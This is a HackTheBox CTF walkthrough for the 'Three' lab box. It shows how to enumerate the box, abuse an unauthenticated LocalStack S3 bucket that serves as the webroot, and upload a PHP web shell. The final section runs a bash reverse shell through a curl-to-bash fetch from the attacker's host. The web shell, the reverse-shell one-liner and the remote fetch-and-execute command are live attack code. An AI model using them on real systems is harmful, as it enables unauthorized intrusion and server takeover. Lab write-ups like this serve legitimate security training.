Three

HackTheBox · Very Easy by Brenno M.

Three is a Linux box whose website uses an S3 bucket (emulated via LocalStack) as storage. The misconfigured bucket accepts unauthenticated uploads, allowing a PHP web shell to be placed at the site root and code execution to be gained. Note: after spawning, the box needs a few minutes for LocalStack to load.

Enumeration

Nmap reveals SSH (22) and HTTP (80). The site is static; the source shows the contact form posts to /action_page.php (PHP backend) and exposes the domain thetoppers.htb, added to /etc/hosts.

sudo nmap -sV <IP>
echo "<IP> thetoppers.htb" | sudo tee -a /etc/hosts

Sub-domain enumeration

A vHost brute-force with gobuster reveals s3.thetoppers.htb. Visiting it, the response {"status": "running"} indicates an S3 service (LocalStack). Add it to /etc/hosts too.

gobuster vhost -w subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain
echo "<IP> s3.thetoppers.htb" | sudo tee -a /etc/hosts

Interacting with S3

With awscli configured using arbitrary values (the server does not validate credentials), we list the buckets. Bucket thetoppers.htb contains index.php and .htaccess, i.e. it is the site's own webroot.

aws configure   # arbitrary values
aws --endpoint=http://s3.thetoppers.htb s3 ls
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb

Code execution

Since the site runs PHP and the bucket is the webroot, upload a PHP web shell to the bucket and browse to the URL, gaining RCE as www-data.

echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
curl 'http://thetoppers.htb/shell.php?cmd=id'   # uid=33(www-data)

Reverse shell and flag

Host a bash reverse-shell script on a local server and, via the web shell, force the target to download and run it. The flag is at /var/www/flag.txt.

# attacker:
nc -nvlp 1337
python3 -m http.server 8000   # serving shell.sh (bash -i >& /dev/tcp/<MY_IP>/1337 0>&1)
# via web shell:
curl 'http://thetoppers.htb/shell.php?cmd=curl%20<MY_IP>:8000/shell.sh|bash'
cat /var/www/flag.txt
